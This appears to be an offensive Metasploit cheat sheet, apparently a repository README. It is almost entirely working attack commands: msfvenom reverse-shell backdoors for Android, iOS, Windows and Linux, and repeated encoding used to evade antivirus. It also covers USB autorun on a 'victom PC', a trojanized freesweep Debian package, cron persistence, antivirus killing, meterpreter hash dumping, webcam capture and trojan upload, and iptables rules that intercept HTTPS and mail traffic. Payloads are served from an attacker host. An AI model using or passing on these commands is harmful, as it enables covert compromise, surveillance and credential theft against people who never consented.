# <img width="55" src="http://0z3r00t3r.6te.net/img/ip.png"> IP Forward  
#### &#x1F538; to open ip forward in linux&#x1F427; terminal type :
      
      sudo echo 1 > /proc/sys/net/ipv4/ip_forward
      sysctl -w net.ipv4.ip_forward=1
      #See a list of network devices and their state: 
      -  nmcli dev
      #Add a rule to intercept [http,https,imaps,pop3s,irc]
      - sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports <PORT/8080>
      - sudo iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-ports <PORT/8080>
      - sudo iptables -t nat -A PREROUTING -p tcp --destination-port 993 -j REDIRECT --to-ports <PORT/8080>
      - sudo iptables -t nat -A PREROUTING -p tcp --destination-port 995 -j REDIRECT --to-ports <PORT/8080>
      - sudo iptables -t nat -A PREROUTING -p tcp --destination-port 6697 -j REDIRECT --to-ports <PORT/8080>

      sudo iptables -t nat -A PREROUTING -i <DEVICE> -p tcp --dport 80 -j REDIRECT --to-port <PORT/8080>
      sudo iptables -t nat -A PREROUTING -i <DEVICE> -p tcp --dport 443 -j REDIRECT --to-port <PORT/8080>
      sudo iptables -t nat -A PREROUTING -i <DEVICE> -p tcp --dport 993 -j REDIRECT --to-port <PORT/8080>
      sudo iptables -t nat -A PREROUTING -i <DEVICE> -p tcp --dport 995 -j REDIRECT --to-port <PORT/8080>
      sudo iptables -t nat -A PREROUTING -i <DEVICE> -p tcp --dport 6697 -j REDIRECT --to-port <PORT/8080>

      sudo iptables -t nat -A OUTPUT -o <DEVICE> -p tcp --dport 80 -j REDIRECT --to-port <PORT/8080>
      sudo iptables -t nat -A OUTPUT -o <DEVICE> -p tcp --dport 443 -j REDIRECT --to-port <PORT/8080>
      sudo iptables -t nat -A OUTPUT -o <DEVICE> -p tcp --dport 993 -j REDIRECT --to-port <PORT/8080>
      sudo iptables -t nat -A OUTPUT -o <DEVICE> -p tcp --dport 995 -j REDIRECT --to-port <PORT/8080>
      sudo iptables -t nat -A OUTPUT -o <DEVICE> -p tcp --dport 6697 -j REDIRECT --to-port <PORT/8080>

      sudo iptables -P INPUT ACCEPT
      sudo iptables -P OUTPUT ACCEPT
      sudo iptables -P FORWARD ACCEPT
      sudo iptables -F INPUT
      sudo iptables -F OUTPUT
      sudo iptables -F FORWARD
      sudo iptables-save
   
# <img width="55" src="http://0z3r00t3r.6te.net/img/msf.png"> MSF Venom Backdoor
#### &#x1F538; APK::Generation 

   `sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=ATTACKErIP LPORT=4511 R > 1.apk`
   
   `msfvenom --payload="android/shell/reverse_tcp" --arch="dalvik" --platform="android" --encode="cmd/powershell_base64" LHOST=ip LPORT=port -k -o 1x.apk`

   `msfvenom --payload="android/shell/reverse_tcp" --arch="dalvik" --platform="android" --encode="cmd/echo" LHOST=ip LPORT=port -k -o 2x.apk`

   <i>on android target</i> : ```run the 1x.apk / or 2x.apk```
      
      use exploit/multi/handler
      set payload android/meterpreter/reverse_tcp
      set AutoRunScript post/multi/manage/multi_post MACRO=/opt/backbox/msfattack/a.rc
      set ReverseListenerBindAddress 192.168.1.32
      set LHOST ATTACKErIP
      set LPORT 4511
      set exitonsession false
      exploit -j
      
#### &#x1F538; IPA(iphone)::Generation

   `msfvenom --payload="apple_ios/armle/meterpreter_reverse_tcp" --platform="apple_ios" --arch="armle" LHOST=ip LPORT=port -f macho -o 1x.ipa`

   `msfvenom --payload="apple_ios/aarch64/shell_reverse_tcp" --platform="apple_ios" --arch="aarch64" LHOST=ip LPORT=4444 -o shell`

   <i>on iphone ssh run</i> `./shell`


#### &#x1F538; PS1(windows)::Generation

   `msfvenom --payload="windows/meterpreter/reverse_http" --format="psh" --platform="windows" --arch="x86" --encoder="cmd/powershell_base64" --encrypt="base64" LHOST=ip LPORT=port -o x86.ps1`

   `msfvenom --payload="windows/meterpreter/reverse_tcp" --platform="windows" --arch="x86" --encoder="x86/shikata_ga_nai" -x cmd.exe -i 14 LHOST=ip LPORT=port -f exe -o bad_cmd.exe`

#### &#x1F538; Auto run without permisstion: use it with USB

   `c:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -NoExit -File x86.ps1`
   
      sudo msfvenom -p windows/download_exec -e x86/shikata_ga_nai -i 3 -b '\x00' '\x20' '\x2f' '\x5c' --smallest --platform win -a x86 EXE=cmd.exe EXITFUNC=process URL=http://ATTACKErIP/cmd.exe -f exe -o /var/www/html/cmd.exe
      
      1: try to open ( powershell ) AS Administrator .. Enter exatly as text down :
      Type Get-ExecutionPolicy
      ^--if restricted good. if Error. ::  Fix:-->
      Type Set-ExecutionPolicy AllSigned or Set-ExecutionPolicy ByPass
      
      #Using ShellCode Https Hack Windows Using Link : 
      msfvenom -p windows/meterpreter/reverse_https LHOST=ATTACKErIP LPORT=4511 -e x86/shikata_ga_nai -i 5 -e x86/countdown -i 3 -e x86/call4_dword_xor -i 5 -e x86/jmp_call_additive -i 5 -f exe > revHttps.exe
      #AFTER MSFVENOM ANIT VIRUST DETECTED THIS CMD : 
      sudo msfvenom -p windows/messagebox title="Hacked" text="Hacked by T4T34m - Team 511 Hacker" -f exe > m.exe
      #TRYING LOOP 3 TIME ENCODE SHIKATA : -i 3 -e x86/shikata_ga_nai  
      #GOOD ( GOOD ) antivirus did not detected it ;) : 
      sudo msfvenom -p windows/messagebox title="Hacked" text="Hacked by T4T34m - Team 511 Hacker" -i 3 -e x86/shikata_ga_nai -f exe > m1.exe

      

#### &#x1F538; MSFvenom Other : 
      msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > shell.py
      msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORTn> -f raw > shell.sh
      msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw > shell.pl
      msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
      
      #1: msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
      #2: cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php


# &#x1F538; MSF Aux / Set : 

      use auxiliary/scanner/http/http_version
      use auxiliary/scanner/http/options
      use auxiliary/scanner/http/ssl
      use auxiliary/scanner/http/webdav_scanner
      use auxiliary/scanner/http/host_header_injection
      use auxiliary/scanner/ssl/openssl_heartbleed
      use auxiliary/scanner/portscan/syn
      use auxiliary/scanner/smb/smb_version
      use auxiliary/scanner/mssql/mssql_ping
      #enum_wayback ALL LINKS 
      use auxiliary/scanner/http/enum_wayback   
      #dir_listing
      use auxiliary/scanner/http/dir_listing
      #dir_scanner
      use auxiliary/scanner/http/dir_scanner
      #dir_webdav_unicode_bypass
      use auxiliary/scanner/http/dir_webdav_unicode_bypass
      #files_dir
      use auxiliary/scanner/http/files_dir
      
      use exploit/windows/browser/ani_loadimage_chunksize
      use exploit/windows/smb/psexec
      use post/linux/gather/hashdump
      
      #Exploit on victom server Linux Cron: 
      #First run this after you have session  :
      use exploit/linux/local/cron_persistence
      set payload cmd/unix/reverse_python
      set target 0
      set cleanup false
      set verbose true
      set LHOST ATTACKErIP
      set session 1
      exploit
      #########[ 2 ]##########
      use exploit/linux/local/cron_persistence
      set payload cmd/unix/reverse_python
      nc -lvp 4444

#### &#x1F538; Set Options : 
      set Proxies socks5:127.0.0.1:9050
      set DisablePayloadHandler false
      set ExitOnSession false
      set ReverseListenerBindAddress 192.168.1.11

#### &#x1F538; Any CMD / meterpreter CMD:
      #kill port number 1337 
      sudo kill -9 `sudo lsof -t -i:1337`
      #port forward :
      meterpreter > ipconfig
      meterpreter > ifconfig eth1
      meterpreter > portfwd add -l 3389 -p 3388 -r <IP_FROM_IFCONFIG>
      meterpreter > netstat -anpt
      meterpreter > execute -f cmd.exe -i -H
      meterpreter > getuid
      meterpreter > run post/windows/gather/hashdump 
      meterpreter > idletime
      meterpreter > ipconfig
      meterpreter > run post/windows/manage/migrate
      meterpreter > search -f sea*.bat c:\\xamp\\
      meterpreter > shell
      meterpreter > upload trojan.exe c:\\windows\\system32
      meterpreter > webcam_list
      meterpreter > webcam_snap -i 1 -v false
      meterpreter > load python
      meterpreter > irb
      meterpreter > portfwd add -l 3389 -p 3389 -r 127.0.0.1
      meterpreter > portfwd list
      meterpreter > execute -H -c -i -f cmd.exe
      meterpreter > run netenum -ps -r 10.10.10.1/24
      meterpreter > portfwd add -l 445 -p 445 -r 192.168.1.36
      meterpreter > portfwd delete -l 3389
      meterpreter > portfwd delete -l 445
      meterpreter > run arp_scanner -r 10.0.0.1/24 
      #Running the irb command will drop you into a live Ruby interpreter shell where you can issue commands and create Metasploit scripts on the fly.
      This feature is also very useful for understanding the internals of the Framework.
      
      ----
      #SMB USERADD: 
      useradd -s /sbin/nologin Lab2_smb
      setenforce 0
      smbclient -L localhost
      tail -f /var/log/samba/log.*
      ----
      #install SMB 
      sudo apt install tasksel
      sudo tasksel install samba-server
      sudo cp /etc/samba/smb.conf /etc/samba/smb.conf_backup
      sudo bash -c 'grep -v -E "^#|^;" /etc/samba/smb.conf_backup | grep . > /etc/samba/smb.conf'
      sudo vi /etc/samba/smb.conf
      ^^inside smb.conf-->
      [homes]
            comment = Home Directories
            browseable = yes
            read only = no
            create mask = 0700
            directory mask = 0700
            valid users = %S
            
      sudo touch /home/Lab1_smb/home_Lab1_smb_hackerLab2002
      sudo touch /var/samba/public_Lab1_smb_hackerLab2002
      sudo mkdir /var/samba
      sudo chmod 777 /var/samba/
      sudo vi /etc/samba/smb.conf
      [public]
            comment = public anonymous access
            path = /var/samba/
            browsable =yes
            create mask = 0660
            directory mask = 0771
            writable = yes
            guest ok = yes
            
      sudo pdbedit -L 
      sudo strings /var/lib/samba/private/passdb.tdb
      sudo tdbdump /var/lib/samba/private/passdb.tdb
      
            
#### &#x1F538; using AutoRunScript in exploit/multi/handler : 
      set AutoRunScript post/multi/manage/multi_post MACRO=/opt/backbox/msfattack/a.rc
      open a.rc and put :
      run post/windows/manage/migrate
      run post/windows/manage/killav
      -----------------------------------------



#### &#x1F538; Windows :

    cd /tmp/
    mkdir Windows_Lab
    cd Windows_Lab/
    sudo msfvenom -p windows/shell/reverse_tcp LHOST=ATTACKErIP LPORT=4511 -f exe > rt.exe
    sudo msfvenom -p windows/shell/bind_hidden_tcp LHOST=ATTACKErIP LPORT=4511 -f exe > bh.exe
    sudo msfvenom -p windows/powershell_reverse_tcp LHOST=ATTACKErIP LPORT=4511 -f exe > ort.exe
    sudo msfvenom -p windows/x64/meterpreter_bind_tcp LHOST=ATTACKErIP LPORT=4511 -f exe > mbt.exe
    sudo msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=ATTACKErIP LPORT=4511 -f exe > mrt.exe
    cp -R *.exe /var/www/html/
    now your ip ATTACKErIP/rt.exe will be used
    ##AUTORUN IN VICTOM PC USING USB : 
    cmd /K "C:\SomeFolder\rt.exe"
    start /b /w /D"C:\StartAndEnd\scripts" NVIDIASystemMonitor.au3
    c:\windows\syswow64\cmd.exe /c c:\windows\sysnative\cmd.exe /c start /b /w /D"C:\StartAndEnd\scripts" NVIDIASystemMonitor.au3
    
    
    
#### &#x1F538; Linux :

      #HACK LINUX freesweep_1 WATCH AMD64 OR i386 : 
      sudo apt-get --download-only install freesweep
      mkdir /tmp/LinuxLab_amd64
      sudo mv /var/cache/apt/archives/freesweep_1.0.1-1_amd64.deb /tmp/LinuxLab_amd64
      cd /tmp/LinuxLab_amd64/
      sudo dpkg --extract freesweep_1.0.1-1_amd64.deb freeweep
      ar x freesweep_1.0.1-1_amd64.deb
      tar -xf control.tar.xz control
      ^-#install ar from terminal : 
      |-^--sudo apt install gdebi-core
      tar xOf freesweep_1.0.1-1_amd64.deb control.tar.gz | tar xv 
      cat postinst
      dpkg-deb --build /tmp/evil/work
      mv work.deb freesweep.deb
      cp freesweep.deb /var/www/
      msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/x86/shell/reverse_tcp; set LHOST ATTACKrIP; set LPORT 443; run; exit -y"
      sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores & /usr/games/freesweep &
      msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=192.168.1.101 LPORT=443 -b "\x00" -f elf -o /tmp/evil/work/usr/games/freesweep_scores
      chmod 755 postinst
     
     
     
